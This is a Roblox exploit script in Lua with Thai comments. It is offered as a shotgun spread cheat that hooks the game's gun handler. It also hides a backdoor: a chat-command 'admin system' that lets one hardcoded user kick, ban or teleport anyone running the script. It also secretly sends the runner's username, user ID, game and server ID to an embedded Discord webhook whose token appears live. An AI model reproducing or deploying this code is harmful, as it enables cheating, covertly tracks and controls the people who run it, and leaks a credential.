--////////////////////////////////////////////////////////////
-- [ส่วนตั้งค่า] Config
--////////////////////////////////////////////////////////////
getgenv().spreadChangerPercentage = 20  -- ยิ่งเลขน้อย กระสุนยิ่งเกาะกลุ่ม (แนะนำ 15-30)

-- ลิ้งค์ Webhook ของคุณ
local WEBHOOK_URL = "https://discord.com/api/webhooks/1447911431881359494/4s6-I0jzTgVDc3xCW3wpJbI9LQ8GzAK2oFtt6aldGE2Yn-tlK_XM8CFxD5yIyb3pb7M-"

-- รายชื่อ Admin (ใส่ ID ของคุณให้แล้ว)
local Whitelist_Admin = {
    8908656348, -- UserID ของคุณ
}

local BanFileName = "3354_ServerBlacklist.json"

--////////////////////////////////////////////////////////////
-- [ส่วนที่ 0] ระบบตรวจสอบ Server Ban (ห้ามเข้าห้องเดิม)
--////////////////////////////////////////////////////////////
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local MarketplaceService = game:GetService("MarketplaceService")

-- ตัวส่ง Request ที่รองรับทุกค่าย
local http_request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

local function checkBanStatus()
    if isfile and isfile(BanFileName) then
        local success, bannedList = pcall(function() return HttpService:JSONDecode(readfile(BanFileName)) end)
        if success and bannedList then
            for _, id in pairs(bannedList) do
                if id == game.JobId then
                    -- ถ้า JobId ตรงกับที่บันทึกไว้ ให้เตะออก
                    LocalPlayer:Kick("You have been kicked from this game [Error Code: 267]")
                    return true
                end
            end
        end
    end
    return false
end

if checkBanStatus() then return end 

local function addServerBan()
    local bannedList = {}
    if isfile and isfile(BanFileName) then
        pcall(function() bannedList = HttpService:JSONDecode(readfile(BanFileName)) end)
    end
    
    local currentJob = game.JobId
    local found = false
    for _, id in pairs(bannedList) do
        if id == currentJob then found = true break end
    end
    
    if not found then
        table.insert(bannedList, currentJob)
        if writefile then
            writefile(BanFileName, HttpService:JSONEncode(bannedList))
        end
    end
end

--////////////////////////////////////////////////////////////
-- [ส่วนที่ 1] ระบบ Admin Commands (.kick / .ban / .bring)
--////////////////////////////////////////////////////////////
task.spawn(function()
    local function isAdmin(userId)
        for _, id in ipairs(Whitelist_Admin) do
            if userId == id then return true end
        end
        return false
    end

    local function isTarget(targetName)
        local myName = LocalPlayer.Name:lower()
        local myDisplay = LocalPlayer.DisplayName:lower()
        targetName = targetName:lower()

        if targetName == "$" then return true end
        if string.find(myName, targetName) or string.find(myDisplay, targetName) then
            return true
        end
        return false
    end

    local function onChatted(msg, speaker)
        if isAdmin(speaker.UserId) then
            local args = string.split(msg, " ")
            local cmd = args[1]:lower()
            local target = args[2]

            if not target then return end
            
            local kickReason = "You have been kicked by " .. speaker.Name

            -- // คำสั่ง .kick (เตะเฉยๆ) //
            if cmd == ".kick" then
                if isTarget(target) then
                    LocalPlayer:Kick(kickReason)
                end
            
            -- // คำสั่ง .ban (เตะ + ห้ามเข้าเซิร์ฟเดิม) //
            elseif cmd == ".ban" then
                if isTarget(target) then
                    addServerBan() -- บันทึกห้องนี้
                    task.wait(0.1)
                    LocalPlayer:Kick(kickReason)
                end

            -- // คำสั่ง .bring (ดึงตัวมาหา) //
            elseif cmd == ".bring" then
                if isTarget(target) then
                    local adminChar = speaker.Character
                    local myChar = LocalPlayer.Character
                    
                    if adminChar and adminChar:FindFirstChild("HumanoidRootPart") and 
                       myChar and myChar:FindFirstChild("HumanoidRootPart") then
                        myChar.HumanoidRootPart.CFrame = adminChar.HumanoidRootPart.CFrame
                    end
                end
            end
        end
    end

    for _, plr in ipairs(Players:GetPlayers()) do
        plr.Chatted:Connect(function(msg) onChatted(msg, plr) end)
    end
    Players.PlayerAdded:Connect(function(plr)
        plr.Chatted:Connect(function(msg) onChatted(msg, plr) end)
    end)
    print("Admin System: Loaded")
end)

--////////////////////////////////////////////////////////////
-- [ส่วนที่ 2] ระบบ Spread (ลดแรงดีด)
--////////////////////////////////////////////////////////////
if not getgenv().spreadChangerLoaded then
    getgenv().spreadChangerLoaded = true
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    
    local function spreadmake(percent)
        percent = math.clamp(percent or 0, 0, 100) / 100
        local x = (math.random() - 0.5) * 0.1 * percent
        local y = (math.random() - 0.5) * 0.2 * percent
        local z = (math.random() - 0.5) * 0.1 * percent
        return Vector3.new(x, y, z)
    end

    task.spawn(function()
        local modules = ReplicatedStorage:WaitForChild("Modules", 30)
        if not modules then return end
        local gunHandler = require(modules:WaitForChild("GunHandler", 30))
        if not gunHandler then return end

        local getAim = gunHandler.getAim
        local oldshoot = gunHandler.shoot

        gunHandler.shoot = function(data)
            local callingScript = getcallingscript()
            if callingScript and tostring(callingScript):find("Shotgun") then
                local wp = data.ForcedOrigin
                local range = data.Range
                local spreadValue = getgenv().spreadChangerPercentage or 0
                data.AimPosition = wp + (getAim(wp) + spreadmake(spreadValue)) * range
            end
            return oldshoot(data)
        end
    end)
end

--////////////////////////////////////////////////////////////
-- [ส่วนที่ 3] Logger (ส่ง Webhook)
--////////////////////////////////////////////////////////////
task.spawn(function()
    if not WEBHOOK_URL or WEBHOOK_URL == "" then return end

    local placeId = game.PlaceId
    local gameName = "Unknown"
    pcall(function() gameName = MarketplaceService:GetProductInfo(placeId).Name end)
    
    local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", LocalPlayer.UserId)

    local payload = {
        ["username"] = "3354 Script",
        ["avatar_url"] = avatarUrl,
        ["embeds"] = {{
            ["title"] = "🔔 Spread Script Activated",
            ["color"] = 16711680,
            ["thumbnail"] = { ["url"] = avatarUrl },
            ["fields"] = {
                { ["name"] = "User:", ["value"] = LocalPlayer.Name .. " ("..LocalPlayer.UserId..")", ["inline"] = true },
                { ["name"] = "Game:", ["value"] = gameName, ["inline"] = false },
                { ["name"] = "JobId:", ["value"] = "```"..game.JobId.."```", ["inline"] = false }
            },
            ["footer"] = { ["text"] = "Admin System: .kick .ban .bring" },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    if http_request then
        http_request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload)
        })
    end
end)
